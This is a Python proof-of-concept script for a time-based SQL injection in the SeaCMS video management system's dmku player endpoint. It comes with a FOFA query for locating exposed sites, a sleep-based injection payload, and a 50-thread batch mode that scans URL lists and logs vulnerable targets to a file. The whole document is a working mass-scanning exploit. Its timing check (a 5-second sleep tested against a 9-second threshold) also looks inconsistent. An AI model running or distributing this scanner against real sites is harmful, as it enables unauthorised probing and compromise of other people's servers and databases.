# SeaCMS海洋影视管理系统/js/player/dmplayer/dmku/接口存在SQL注入漏洞
import argparse, requests, sys, time, re
from termcolor import colored
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


# fofa语句
# app="海洋cms"

def banner():
    test = """
██╗  ██╗██╗   ██╗ ██████╗███╗   ███╗███████╗      ███████╗ ██████╗ ██╗     
██║  ██║╚██╗ ██╔╝██╔════╝████╗ ████║██╔════╝      ██╔════╝██╔═══██╗██║     
███████║ ╚████╔╝ ██║     ██╔████╔██║███████╗█████╗███████╗██║   ██║██║     
██╔══██║  ╚██╔╝  ██║     ██║╚██╔╝██║╚════██║╚════╝╚════██║██║▄▄ ██║██║     
██║  ██║   ██║   ╚██████╗██║ ╚═╝ ██║███████║      ███████║╚██████╔╝███████╗
╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝     ╚═╝╚══════╝      ╚══════╝ ╚══▀▀═╝ ╚══════╝

"""
    colored_color = colored(test, 'blue')
    print(colored_color)


def main():
    banner()
    parser = argparse.ArgumentParser(
        description='SeaCMS海洋影视管理系统/js/player/dmplayer/dmku/接口存在SQL注入漏洞POC')
    parser.add_argument('-u', '--url', dest='url', type=str, help="请输入你要测试的URL")
    parser.add_argument('-f', '--file', dest='file', type=str, help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    api_payload = "/js/player/dmplayer/dmku/?ac=del&id=(select(0)from(select(sleep(5)))v)&type=list"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'keep-alive',
    }
    try:
        response1 = requests.get(url=target, verify=False, timeout=10)
        response2 = requests.get(url=target + api_payload, headers=headers, verify=False, timeout=10)
        time1 = response1.elapsed.total_seconds()
        time2 = response2.elapsed.total_seconds()
        if time2 - time1 >= 9:
            print(f"[+]{target} 存在sql注入漏洞")
            with open('result.txt', 'a') as fp:
                fp.write(target + '\n')
        else:
            print(f"[-]{target} 不存在sql注入漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")


if __name__ == '__main__':
    main()